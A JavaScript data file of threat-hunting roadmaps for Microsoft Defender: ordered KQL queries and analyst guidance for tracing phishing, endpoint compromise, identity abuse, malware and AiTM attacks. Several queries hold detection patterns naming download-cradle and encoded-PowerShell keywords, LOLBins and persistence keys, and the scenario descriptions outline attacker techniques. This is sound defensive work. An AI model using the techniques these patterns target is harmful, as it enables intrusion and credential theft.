// Investigation roadmaps for "Roadmap Through the Data" tool.
// Each roadmap is an ordered list of stops — tables an analyst should hit
// in a typical investigation around that starting pivot.

export const ROADMAP_TYPES = [
  { id: "email",      kind: "pivot",    label: "Email",             icon: "📧", color: "#b47fff", description: "Trace an email-borne threat from delivery through execution and lateral spread" },
  { id: "device",     kind: "pivot",    label: "Device",            icon: "💻", color: "#00d4ff", description: "Investigate suspicious activity originating from or targeting an endpoint" },
  { id: "identity",   kind: "pivot",    label: "Identity",          icon: "🪪", color: "#ffb347", description: "Follow a compromised or suspicious account across cloud, identity, and endpoint layers" },
  { id: "malware",    kind: "pivot",    label: "Malware",           icon: "🦠", color: "#ff4757", description: "Hunt from a known malicious file or hash through execution, persistence, and C2" },
  { id: "ip",         kind: "pivot",    label: "IP Address",        icon: "🌐", color: "#47ff8f", description: "Pivot from a suspicious IP across network, auth, email, and cloud telemetry" },
  { id: "devicecode",  kind: "scenario", label: "Device Code Phish",   icon: "🔑", color: "#f97316", description: "Attacker tricks a user into authorising an attacker-controlled OAuth device code — MFA is satisfied by the victim but tokens go straight to the attacker" },
  { id: "aitm",        kind: "scenario", label: "AiTM → Azure VM Exec", icon: "🕳️", color: "#38bdf8", description: "Attacker proxies a Microsoft login in real time to steal the session cookie, replays it into Azure Portal, enumerates VMs, and runs a download cradle via Run Command to execute malware" },
  { id: "becfraud",    kind: "scenario", label: "AiTM → BEC Fraud",     icon: "💸", color: "#fb923c", description: "Session cookie theft leads to inbox rule creation and mailbox reconnaissance, then the attacker impersonates a vendor and redirects a wire transfer" },
  { id: "infostealer", kind: "scenario", label: "Info Stealer",          icon: "🕵️", color: "#a78bfa", description: "Malvertising or fake software drops Lumma/Redline/StealC — the stealer harvests browser credentials, cookies, and crypto wallets then exfils via Telegram Bot API or Discord webhook" },
  { id: "clickfix",    kind: "scenario", label: "ClickFix",              icon: "📋", color: "#22d3ee", description: "Fake CAPTCHA or browser-error dialog hijacks the clipboard with an encoded PowerShell cradle and instructs the user to paste it into Windows Run — no attachment, no macro" },
];

export const ROADMAPS = {

  // ── Email ────────────────────────────────────────────────────────────────────
  email: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage the Alert",
        goal: "Investigation starts when an alert fires or a tip comes in — not when you're browsing raw telemetry. AlertInfo gives you the detection title, severity, MITRE technique IDs, and which Defender product generated the signal (MDO, MDE, MDI, MDCA). AlertEvidence maps that alert to specific email entities: a NetworkMessageId, a sender address, a recipient account, a URL, or a file hash. Collect every IOC from evidence now — they become the entry points for every table that follows. If you are proactively threat hunting with no alert, skip to EmailEvents.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(7d)
| where Category in ("InitialAccess","Phishing","SuspiciousActivity","MaliciousContent")
    or Title has_any (
        "phish","malicious email","malicious attachment",
        "malicious link","spam campaign","suspicious email"
      )
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
// Pull specific evidence entities tied to a known AlertId
AlertEvidence
| where AlertId == "<AlertId_from_AlertInfo>"
| project Timestamp, AlertId, EntityType, EvidenceRole,
          AccountName, AccountUpn, DeviceName,
          FileName, SHA256, NetworkMessageId, RemoteIP`,
      },
      {
        table: "EmailEvents",
        label: "Find the Email",
        goal: "Establish the delivery event. Identify the sender, recipient, subject, delivery action, and whether Defender took action. Look for spoofed domains, external senders, and policy overrides that let malicious mail through.",
        pivotColumns: ["NetworkMessageId", "SenderFromAddress", "SenderIPv4", "RecipientEmailAddress", "DeliveryAction", "ThreatTypes"],
        kql: `EmailEvents
| where Timestamp > ago(7d)
| where ThreatTypes != ""
    or DeliveryAction in ("Blocked", "Replaced")
    or SenderFromDomain !endswith "yourdomain.com"
| project Timestamp, SenderFromAddress, SenderIPv4,
          RecipientEmailAddress, Subject, DeliveryAction,
          ThreatTypes, NetworkMessageId
| sort by Timestamp desc`,
      },
      {
        table: "EmailAttachmentInfo",
        label: "Check Attachments",
        goal: "Identify files delivered in the email. Capture SHA256 hashes and file names — these are your pivots into the endpoint. Look for double-extension files, Office documents with macros, and archives hiding executables.",
        pivotColumns: ["NetworkMessageId", "SHA256", "FileName", "RecipientEmailAddress"],
        kql: `EmailAttachmentInfo
| where Timestamp > ago(7d)
| where NetworkMessageId == "<id_from_EmailEvents>"
| project Timestamp, FileName, FileType,
          SHA256, ThreatNames, MalwareFilterVerdict`,
      },
      {
        table: "EmailUrlInfo",
        label: "Inspect URLs",
        goal: "Check every URL embedded in the email. Phishing links, redirect chains, and credential harvesting pages all leave traces here. Correlate with UrlClickEvents to see if anyone actually clicked.",
        pivotColumns: ["NetworkMessageId", "Url", "UrlDomain"],
        kql: `EmailUrlInfo
| where Timestamp > ago(7d)
| where NetworkMessageId == "<id_from_EmailEvents>"
| project Timestamp, Url, UrlDomain, UrlLocation`,
      },
      {
        table: "UrlClickEvents",
        label: "Who Clicked?",
        goal: "Determine if anyone actually clicked the link and whether Safe Links allowed or blocked it. ActionType values of 'ClickAllowed' confirm the user reached the phishing page. IsClickedThrough means they bypassed a Safe Links warning. AccountUpn here is the bridge from email to the user's endpoint and cloud identity.",
        pivotColumns: ["AccountUpn", "Url", "ActionType", "IsClickedThrough", "NetworkMessageId"],
        kql: `UrlClickEvents
| where Timestamp > ago(7d)
| where NetworkMessageId == "<id_from_EmailEvents>"
    or Url has "<domain_from_EmailUrlInfo>"
| project Timestamp, AccountUpn, Url, ActionType,
          IsClickedThrough, IPAddress, NetworkMessageId
| sort by Timestamp desc`,
      },
      {
        table: "DeviceFileEvents",
        label: "Attachment on Disk?",
        goal: "Did the recipient open the attachment and save it to disk? Search by SHA256 or filename. The InitiatingProcessFileName tells you what opened it — Outlook, a browser, or something else. Look for files written to Temp, Downloads, or AppData.",
        pivotColumns: ["SHA256", "FileName", "FolderPath", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceFileEvents
| where Timestamp > ago(7d)
| where SHA256 == "<hash_from_EmailAttachmentInfo>"
    or FileName == "<filename_from_EmailAttachmentInfo>"
| project Timestamp, DeviceName, FileName, FolderPath,
          SHA256, InitiatingProcessFileName,
          InitiatingProcessCommandLine, ActionType`,
      },
      {
        table: "DeviceProcessEvents",
        label: "Was it Executed?",
        goal: "Determine if the attachment ran. Look for child processes spawned by Office applications, script interpreters (wscript, powershell, cmd) launched from unusual parents, or processes with the suspicious file's hash. LOLBin abuse often starts here.",
        pivotColumns: ["SHA256", "FileName", "ProcessCommandLine", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("WINWORD.EXE","EXCEL.EXE","OUTLOOK.EXE","POWERPNT.EXE")
    and FileName in~ ("powershell.exe","cmd.exe","wscript.exe","mshta.exe","regsvr32.exe")
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          AccountName, SHA256`,
      },
      {
        table: "DeviceNetworkEvents",
        label: "C2 Callback?",
        goal: "After execution, most malware calls home. Look for outbound connections from the process that ran the attachment — unusual remote IPs, high-entropy domain names, non-standard ports, or beaconing patterns (regular short intervals).",
        pivotColumns: ["RemoteIP", "RemoteUrl", "RemotePort", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("powershell.exe","cmd.exe","wscript.exe","mshta.exe")
    and RemoteIPType == "Public"
| summarize ConnectionCount=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp)
    by DeviceName, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName
| sort by ConnectionCount desc`,
      },
    ],
  },

  // ── Device ───────────────────────────────────────────────────────────────────
  device: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage the Alert",
        goal: "Start with Defender's verdict before touching raw telemetry. AlertInfo tells you the detection title, severity, MITRE technique, and which product fired (MDE, MDI, MDCA). AlertEvidence pins the alert to specific entities on the device — the process hash, the file path, a registry key, or the account involved. These confirmed IOCs let you skip broad hunting and jump straight to the relevant events. If no alert exists and you are proactively hunting, skip to DeviceEvents.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(7d)
| where Category in (
    "Malware","SuspiciousActivity","MaliciousContent",
    "Ransomware","LateralMovement","Persistence","Execution"
  )
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
// Pull device-specific evidence entities from a known alert
AlertEvidence
| where AlertId == "<AlertId_from_AlertInfo>"
    and DeviceName == "<target_device>"
| project Timestamp, AlertId, EntityType, EvidenceRole,
          DeviceName, FileName, FolderPath, SHA256,
          ProcessCommandLine, RemoteIP, AccountName`,
      },
      {
        table: "DeviceEvents",
        label: "Device Baseline",
        goal: "Get a broad view of what happened on the device. DeviceEvents captures everything from antivirus detections to AMSI triggers, network share access, and PowerShell logging. It's the widest net before you narrow down to specific event types.",
        pivotColumns: ["DeviceName", "DeviceId", "InitiatingProcessFileName", "AccountName"],
        kql: `DeviceEvents
| where Timestamp > ago(7d)
| where DeviceName == "<target_device>"
| where ActionType in (
    "AntivirusDetection","PowerShellCommand",
    "NetworkShareAccess","SuspiciousScriptExecution"
  )
| project Timestamp, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine, AccountName, AdditionalFields
| sort by Timestamp desc`,
      },
      {
        table: "DeviceProcessEvents",
        label: "Process Execution",
        goal: "The core of most endpoint investigations. Look for unusual parent-child relationships, LOLBins (living-off-the-land binaries), processes spawning from temp directories, encoded PowerShell commands, and executables that don't match their expected path.",
        pivotColumns: ["FileName", "SHA256", "ProcessCommandLine", "InitiatingProcessFileName", "AccountName"],
        kql: `DeviceProcessEvents
| where Timestamp > ago(7d)
| where DeviceName == "<target_device>"
| where FolderPath has_any (@"\Temp\", @"\AppData\", @"\Downloads\")
    or ProcessCommandLine has_any ("-enc","-EncodedCommand","IEX","DownloadString","WebClient")
    or InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe")
| project Timestamp, FileName, FolderPath, SHA256,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine, AccountName`,
      },
      {
        table: "DeviceFileEvents",
        label: "File Drops",
        goal: "What was written to disk and by what? Look for new executables, scripts, or documents dropped in unusual locations. SHA256 is your cross-reference to threat intel and other tables. Watch for files written by LOLBins or system processes.",
        pivotColumns: ["SHA256", "FileName", "FolderPath", "InitiatingProcessFileName"],
        kql: `DeviceFileEvents
| where Timestamp > ago(7d)
| where DeviceName == "<target_device>"
| where ActionType in ("FileCreated","FileModified","FileRenamed")
    and (FolderPath has_any (@"\Temp\",@"\AppData\",@"\ProgramData\",@"\Windows\Temp\")
      or FileName endswith ".exe" or FileName endswith ".ps1"
      or FileName endswith ".bat" or FileName endswith ".vbs")
| project Timestamp, ActionType, FileName, FolderPath,
          SHA256, InitiatingProcessFileName`,
      },
      {
        table: "DeviceNetworkEvents",
        label: "Network Connections",
        goal: "Identify outbound connections to external IPs and domains. Beaconing shows up as many short connections at regular intervals to the same IP. Look for connections from unusual processes, non-standard ports, and newly registered or dynamic DNS domains.",
        pivotColumns: ["RemoteIP", "RemoteUrl", "RemotePort", "InitiatingProcessFileName"],
        kql: `DeviceNetworkEvents
| where Timestamp > ago(7d)
| where DeviceName == "<target_device>"
    and RemoteIPType == "Public"
| summarize
    Connections = count(),
    FirstSeen   = min(Timestamp),
    LastSeen    = max(Timestamp),
    Ports       = make_set(RemotePort)
  by RemoteIP, RemoteUrl, InitiatingProcessFileName
| sort by Connections desc`,
      },
      {
        table: "DeviceRegistryEvents",
        label: "Persistence",
        goal: "Attackers establish persistence via registry Run keys, services, scheduled tasks, and COM hijacking. Look for modifications to common persistence locations and values that reference unusual file paths or encoded commands.",
        pivotColumns: ["DeviceName", "DeviceId", "AccountName", "InitiatingProcessFileName"],
        kql: `DeviceRegistryEvents
| where Timestamp > ago(7d)
| where DeviceName == "<target_device>"
| where RegistryKey has_any (
    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    @"SYSTEM\CurrentControlSet\Services",
    @"SOFTWARE\Classes\CLSID"
  )
| project Timestamp, ActionType, RegistryKey,
          RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, AccountName`,
      },
      {
        table: "DeviceLogonEvents",
        label: "Lateral Movement",
        goal: "Did an attacker move from this device to others, or did someone suspicious log in? Look for network logons (type 3), pass-the-hash (type 9 with NTLM), and logons from unusual source IPs. Failed logons in bursts signal credential spraying.",
        pivotColumns: ["AccountName", "RemoteIP", "LogonType", "DeviceName"],
        kql: `DeviceLogonEvents
| where Timestamp > ago(7d)
| where DeviceName == "<target_device>"
| where LogonType in (3, 9, 10)
| summarize
    LogonCount  = count(),
    FirstSeen   = min(Timestamp),
    FailCount   = countif(ActionType == "LogonFailed")
  by AccountName, RemoteIP, LogonType
| sort by LogonCount desc`,
      },
      {
        table: "IdentityLogonEvents",
        label: "Identity Impact",
        goal: "Cross-reference with identity layer telemetry. IdentityLogonEvents captures Kerberos and NTLM events at the domain controller level — more authoritative than device-level logs. Check if accounts used on this device authenticated from other locations simultaneously (impossible travel).",
        pivotColumns: ["AccountUpn", "IPAddress", "LogonType", "Protocol"],
        kql: `IdentityLogonEvents
| where Timestamp > ago(7d)
| where AccountName == "<account_from_device>"
| project Timestamp, AccountUpn, IPAddress, DeviceName,
          LogonType, ActionType, FailureReason, Protocol
| sort by Timestamp desc`,
      },
    ],
  },

  // ── Identity ─────────────────────────────────────────────────────────────────
  identity: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage the Alert",
        goal: "Identity alerts can originate from multiple Defender products — MDI sees on-prem Kerberos/NTLM anomalies, MDCA flags cloud app risky behavior, and MDO catches credential phishing. Start here to understand what was detected and from which source before pulling auth logs. AlertEvidence links each alert to the specific account UPN, object ID, or source IP that was flagged — anchor your entire investigation to those identifiers. If proactively hunting with no alert, skip to IdentityLogonEvents.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(14d)
| where Category in (
    "CredentialAccess","LateralMovement","Persistence",
    "PrivilegeEscalation","InitialAccess","Reconnaissance"
  )
  or Title has_any (
      "identity","account","credential","sign-in",
      "logon","password","MFA","Kerberos","NTLM","spray"
    )
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
// Get identity evidence entities from a known alert
AlertEvidence
| where AlertId == "<AlertId_from_AlertInfo>"
    and EntityType in ("User","Account","CloudLogonRequest")
| project Timestamp, AlertId, EntityType, EvidenceRole,
          AccountName, AccountUpn, AccountObjectId,
          DeviceName, RemoteIP`,
      },
      {
        table: "IdentityLogonEvents",
        label: "Authentication Pattern",
        goal: "Start with the full authentication history. Look for logon failures followed by success (password spray or brute force), logins from new countries or IPs, unusual hours, and protocol mismatches (NTLM where Kerberos is expected). This is ground truth for on-prem auth.",
        pivotColumns: ["AccountUpn", "IPAddress", "FailureReason", "LogonType", "Protocol"],
        kql: `IdentityLogonEvents
| where Timestamp > ago(14d)
| where AccountUpn == "<target_upn>"
| summarize
    TotalLogons  = count(),
    Failures     = countif(ActionType == "LogonFailed"),
    UniqueIPs    = dcount(IPAddress),
    Countries    = make_set(Country)
  by bin(Timestamp, 1h)
| where Failures > 5 or UniqueIPs > 3
| sort by Timestamp desc`,
      },
      {
        table: "AADSignInEventsBeta",
        label: "Cloud Auth & MFA",
        goal: "The cloud-layer view of authentication. Check for MFA fatigue attacks (many MFA prompts), legacy auth bypasses (no MFA required), Conditional Access policy failures, and sign-ins from unexpected countries or anonymizing proxies. ErrorCode 50074 = MFA required but not completed.",
        pivotColumns: ["AccountUpn", "IPAddress", "ApplicationId", "ErrorCode", "ConditionalAccessStatus"],
        kql: `AADSignInEventsBeta
| where Timestamp > ago(14d)
| where AccountUpn == "<target_upn>"
| where ErrorCode != 0 or Country != "<expected_country>"
| project Timestamp, IPAddress, Country, Application,
          ErrorCode, ConditionalAccessStatus,
          AuthenticationRequirement, IsManaged`,
      },
      {
        table: "IdentityQueryEvents",
        label: "Recon Activity",
        goal: "After initial access, attackers query Active Directory to understand the environment. Look for LDAP queries for admin groups, trust relationships, service accounts, and computers. High-volume LDAP queries from a single account are a strong signal of BloodHound or similar tooling.",
        pivotColumns: ["AccountUpn", "QueryTarget", "QueryType", "Protocol"],
        kql: `IdentityQueryEvents
| where Timestamp > ago(7d)
| where AccountUpn == "<target_upn>"
| summarize QueryCount=count(), Targets=make_set(QueryTarget)
    by QueryType, Protocol, bin(Timestamp, 30m)
| where QueryCount > 20
| sort by QueryCount desc`,
      },
      {
        table: "IdentityDirectoryEvents",
        label: "Directory Changes",
        goal: "Has the account been modified, or did the account modify others? Look for password resets, group membership changes (especially to Domain Admins), account creation, and attribute changes. Attackers often add themselves to privileged groups or create backdoor accounts.",
        pivotColumns: ["AccountUpn", "TargetAccountUpn", "TargetAccountDisplayName", "ActionType"],
        kql: `IdentityDirectoryEvents
| where Timestamp > ago(7d)
| where AccountUpn == "<target_upn>"
    or TargetAccountDisplayName == "<target_display_name>"
| where ActionType in (
    "Group Membership changed","Account Password changed",
    "User Account created","Account Enabled",
    "Sensitive Group Membership changed"
  )
| project Timestamp, ActionType, AccountUpn,
          TargetAccountDisplayName, ModifiedProperties`,
      },
      {
        table: "DeviceLogonEvents",
        label: "Endpoint Access",
        goal: "Which physical machines did this identity touch? Network logons (type 3) indicate lateral movement or remote admin. Interactive logons (type 2) are console sessions. RDP (type 10) is a common attacker path. Multiple devices in a short window is a red flag.",
        pivotColumns: ["AccountName", "DeviceName", "RemoteIP", "LogonType"],
        kql: `DeviceLogonEvents
| where Timestamp > ago(7d)
| where AccountName =~ "<samaccountname>"
    and ActionType == "LogonSuccess"
| summarize
    Devices    = make_set(DeviceName),
    LogonCount = count()
  by LogonType, bin(Timestamp, 1h)
| sort by Timestamp desc`,
      },
      {
        table: "CloudAppEvents",
        label: "Cloud App Activity",
        goal: "What did this identity do in Microsoft 365 and connected SaaS apps? Look for large mail exports, SharePoint downloads, Teams message deletions, forwarding rule creation, and OAuth app consent grants. These are the most common post-compromise actions.",
        pivotColumns: ["AccountObjectId", "Application", "ActionType", "IPAddress"],
        kql: `CloudAppEvents
| where Timestamp > ago(7d)
| where AccountObjectId == "<aad_object_id>"
| where ActionType in (
    "MailItemsAccessed","Send","MoveToDeletedItems",
    "FileDownloaded","AnonymousLinkCreated",
    "New-InboxRule","Set-Mailbox","Add-MailboxPermission"
  )
| project Timestamp, Application, ActionType,
          IPAddress, UserAgent, RawEventData`,
      },
    ],
  },

  // ── Malware ──────────────────────────────────────────────────────────────────
  malware: {
    steps: [
      {
        table: "AlertEvidence",
        label: "Start with the Alert",
        goal: "Get the initial detection context. AlertEvidence tells you what Defender saw: the file hash, the device, the process, and what role each piece played. Pull the SHA256 now — it's your primary pivot for everything that follows.",
        pivotColumns: ["AlertId", "SHA256", "FileName", "DeviceName", "EntityType", "EvidenceRole"],
        kql: `AlertEvidence
| where Timestamp > ago(7d)
| where EntityType == "File"
    and SHA256 == "<malware_hash>"
| project Timestamp, AlertId, EvidenceRole,
          FileName, FolderPath, SHA256, DeviceName, AccountName
| join kind=inner (
    AlertInfo | project AlertId, Title, Severity, Category, AttackTechniques
  ) on AlertId`,
      },
      {
        table: "DeviceFileEvents",
        label: "File Origin",
        goal: "Where did the file come from and what created it? The InitiatingProcessFileName reveals the dropper — was it written by a browser, an Office app, or another executable? FolderPath tells you where it landed. Look for staging directories and unusual locations.",
        pivotColumns: ["SHA256", "FileName", "FolderPath", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceFileEvents
| where Timestamp > ago(7d)
| where SHA256 == "<malware_hash>"
| project Timestamp, DeviceName, ActionType, FileName,
          FolderPath, SHA256, InitiatingProcessFileName,
          InitiatingProcessCommandLine, InitiatingProcessAccountName`,
      },
      {
        table: "DeviceProcessEvents",
        label: "Execution & Children",
        goal: "What did the malware do after it ran? Map the full process tree — the parent that launched it and every child it spawned. Malware often spawns cmd, PowerShell, or rundll32 to perform next-stage actions. ProcessCommandLine is critical for LOLBin detection.",
        pivotColumns: ["SHA256", "FileName", "ProcessCommandLine", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceProcessEvents
| where Timestamp > ago(7d)
| where SHA256 == "<malware_hash>"
    or InitiatingProcessSHA256 == "<malware_hash>"
| project Timestamp, DeviceName, AccountName,
          FileName, ProcessCommandLine, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc`,
      },
      {
        table: "DeviceNetworkEvents",
        label: "C2 & Exfiltration",
        goal: "Map every external connection made by the malware process. Identify C2 IPs and domains — look for beaconing (regular short intervals), large outbound data transfers, DNS tunneling (long hostnames), and connections to hosting providers known to allow abuse.",
        pivotColumns: ["RemoteIP", "RemoteUrl", "RemotePort", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessSHA256 == "<malware_hash>"
    and RemoteIPType == "Public"
| summarize
    Connections = count(),
    TotalBytes  = sum(SentBytes + ReceivedBytes),
    FirstSeen   = min(Timestamp),
    LastSeen    = max(Timestamp)
  by RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName
| sort by Connections desc`,
      },
      {
        table: "DeviceRegistryEvents",
        label: "Persistence Mechanisms",
        goal: "Did the malware establish persistence? Check common run keys, scheduled task registry entries, service creation, and COM object hijacking. RegistryValueData often contains the full command line or path to the persisted payload.",
        pivotColumns: ["DeviceName", "DeviceId", "AccountName", "InitiatingProcessFileName"],
        kql: `DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessSHA256 == "<malware_hash>"
    or InitiatingProcessFileName == "<malware_filename>"
| project Timestamp, DeviceName, ActionType,
          RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName`,
      },
      {
        table: "EmailAttachmentInfo",
        label: "Delivered via Email?",
        goal: "Check if this hash was delivered as an email attachment. If yes, you have a delivery vector and can pivot to EmailEvents to find every recipient. This tells you the blast radius and helps identify the phishing campaign.",
        pivotColumns: ["SHA256", "NetworkMessageId", "FileName", "RecipientEmailAddress"],
        kql: `EmailAttachmentInfo
| where Timestamp > ago(30d)
| where SHA256 == "<malware_hash>"
| project Timestamp, NetworkMessageId, FileName,
          FileType, ThreatNames, MalwareFilterVerdict
| join kind=inner (
    EmailEvents
    | project NetworkMessageId, SenderFromAddress,
               RecipientEmailAddress, Subject, DeliveryAction
  ) on NetworkMessageId`,
      },
      {
        table: "DeviceLogonEvents",
        label: "Credential Use & Spread",
        goal: "Did the malware steal or use credentials? Look for logons originating from the infected device to other machines (lateral movement). NTLM logons with type 9 can indicate pass-the-hash. New accounts logging in from the device post-compromise are a critical signal.",
        pivotColumns: ["AccountName", "RemoteIP", "LogonType", "DeviceName"],
        kql: `DeviceLogonEvents
| where Timestamp > ago(7d)
| where DeviceName == "<infected_device>"
    and LogonType in (3, 9)
    and ActionType == "LogonSuccess"
| summarize
    TargetDevices = make_set(DeviceName),
    Count = count()
  by AccountName, RemoteIP, LogonType
| sort by Count desc`,
      },
    ],
  },

  // ── IP Address ───────────────────────────────────────────────────────────────
  ip: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage the Alert",
        goal: "An IP indicator may have surfaced from threat intel, network telemetry, or an active detection. Before pivoting through every data source, check what Defender already knows. AlertEvidence with EntityType == 'Ip' links the IP to all existing alerts — this immediately tells you whether it's flagged as C2, a spam sender, a brute-force source, or an exfil destination, and which other entities (devices, accounts) it was already associated with. Starting here prevents redundant work and may reveal attack context that raw network logs alone cannot provide.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `// Find all alerts where this IP appears as an evidence entity
AlertEvidence
| where Timestamp > ago(7d)
| where EntityType == "Ip"
    and RemoteIP == "<target_ip>"
| join kind=inner (
    AlertInfo | project AlertId, Title, Severity, Category, AttackTechniques, ServiceSource
  ) on AlertId
| project Timestamp, AlertId, Title, Severity, Category,
          AttackTechniques, ServiceSource, EvidenceRole, RemoteIP
| sort by Timestamp desc
---
// Broader: recent alerts to correlate if the IP isn't yet in evidence
AlertInfo
| where Timestamp > ago(7d)
| project Timestamp, AlertId, Title, Severity, Category, ServiceSource
| sort by Timestamp desc`,
      },
      {
        table: "DeviceNetworkEvents",
        label: "Network Connections",
        goal: "Which devices in the environment talked to this IP, and what process made the connection? The InitiatingProcessFileName tells you whether it was a browser, a malware implant, or a system process. Look for unusual processes making external connections and beaconing patterns.",
        pivotColumns: ["RemoteIP", "DeviceName", "InitiatingProcessFileName", "RemotePort", "RemoteUrl"],
        kql: `DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP == "<target_ip>"
| summarize
    Connections  = count(),
    FirstSeen    = min(Timestamp),
    LastSeen     = max(Timestamp),
    Processes    = make_set(InitiatingProcessFileName),
    Devices      = make_set(DeviceName)
  by RemoteIP, RemotePort, RemoteUrl
| sort by Connections desc`,
      },
      {
        table: "IdentityLogonEvents",
        label: "Auth from this IP",
        goal: "Did any identity authenticate from this IP against on-premises systems? This links a network indicator to an account, which may reveal compromised credentials being used from attacker infrastructure. Multiple accounts from the same IP suggests credential spraying.",
        pivotColumns: ["IPAddress", "AccountUpn", "LogonType", "FailureReason", "Protocol"],
        kql: `IdentityLogonEvents
| where Timestamp > ago(7d)
| where IPAddress == "<target_ip>"
| summarize
    Accounts   = make_set(AccountUpn),
    Successes  = countif(ActionType == "LogonSuccess"),
    Failures   = countif(ActionType == "LogonFailed")
  by IPAddress, LogonType, Protocol
| sort by Failures desc`,
      },
      {
        table: "AADSignInEventsBeta",
        label: "Cloud Auth from IP",
        goal: "Did anyone sign into Azure AD / Entra ID from this IP? Check for successful MFA bypasses, legacy auth sign-ins, and which applications were accessed. Attackers using stolen credentials often authenticate to cloud apps first before pivoting to email or SharePoint.",
        pivotColumns: ["IPAddress", "AccountUpn", "ApplicationId", "ErrorCode", "ConditionalAccessStatus"],
        kql: `AADSignInEventsBeta
| where Timestamp > ago(7d)
| where IPAddress == "<target_ip>"
| project Timestamp, AccountUpn, Application,
          IPAddress, Country, ErrorCode,
          ConditionalAccessStatus, AuthenticationRequirement
| sort by Timestamp desc`,
      },
      {
        table: "EmailEvents",
        label: "Emails from this IP",
        goal: "Was any email sent from or through this IP? SenderIPv4 captures the sending mail server's IP. If the IP is known C2 or attacker infrastructure, you may find spear phishing campaigns targeting your org. Pivot to NetworkMessageId for attachment and URL analysis.",
        pivotColumns: ["SenderIPv4", "SenderFromAddress", "RecipientEmailAddress", "NetworkMessageId"],
        kql: `EmailEvents
| where Timestamp > ago(30d)
| where SenderIPv4 == "<target_ip>"
| project Timestamp, SenderFromAddress, SenderIPv4,
          RecipientEmailAddress, Subject,
          DeliveryAction, ThreatTypes, NetworkMessageId`,
      },
      {
        table: "CloudAppEvents",
        label: "Cloud App Activity",
        goal: "Did this IP appear in any Microsoft 365 or cloud app activity? CloudAppEvents captures the source IP for every action. An attacker using this IP to access SharePoint, Exchange, or Teams will appear here — look for data access, forwarding rule creation, and file downloads.",
        pivotColumns: ["IPAddress", "Application", "ActionType", "AccountObjectId"],
        kql: `CloudAppEvents
| where Timestamp > ago(7d)
| where IPAddress == "<target_ip>"
| summarize
    Actions  = make_set(ActionType),
    Accounts = make_set(AccountObjectId),
    Count    = count()
  by Application, IPAddress
| sort by Count desc`,
      },
    ],
  },

  // ── AiTM Phishing → Azure VM Execution ───────────────────────────────────
  aitm: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage Existing Detections",
        goal: "Before walking the kill chain step by step, check what Defender XDR already detected. AiTM attacks trigger analytics across multiple products: MDO may have flagged the phishing link, MDCA fires on impossible travel or anomalous token usage, and MDI may alert on suspicious sign-in patterns. The ServiceSource field tells you which part of the kill chain already has coverage. Use confirmed AlertEvidence IOCs — the compromised account UPN, the attacker's IP, the proxy domain — to anchor every subsequent query. Stages with no corresponding alert are detection coverage gaps worth documenting. If Defender has already correlated the full chain, the evidence entities here may let you skip directly to containment.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(14d)
| where Title has_any (
    "AiTM", "adversary-in-the-middle",
    "impossible travel", "token theft",
    "suspicious sign-in", "risky sign",
    "Run Command", "unusual VM activity",
    "suspicious Azure", "suspicious cloud",
    "download cradle", "malicious PowerShell"
  )
  or AttackTechniques has_any ("T1557", "T1059", "T1078", "T1562", "T1534")
  or Category in ("InitialAccess", "Execution", "CredentialAccess")
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
// Get evidence entities from each alert to seed downstream pivots
AlertEvidence
| where AlertId in ("<AlertId1>","<AlertId2>")
| project Timestamp, AlertId, EntityType, EvidenceRole,
          AccountUpn, DeviceName, SHA256, RemoteIP`,
      },
      {
        table: "EmailEvents",
        label: "The AiTM Lure",
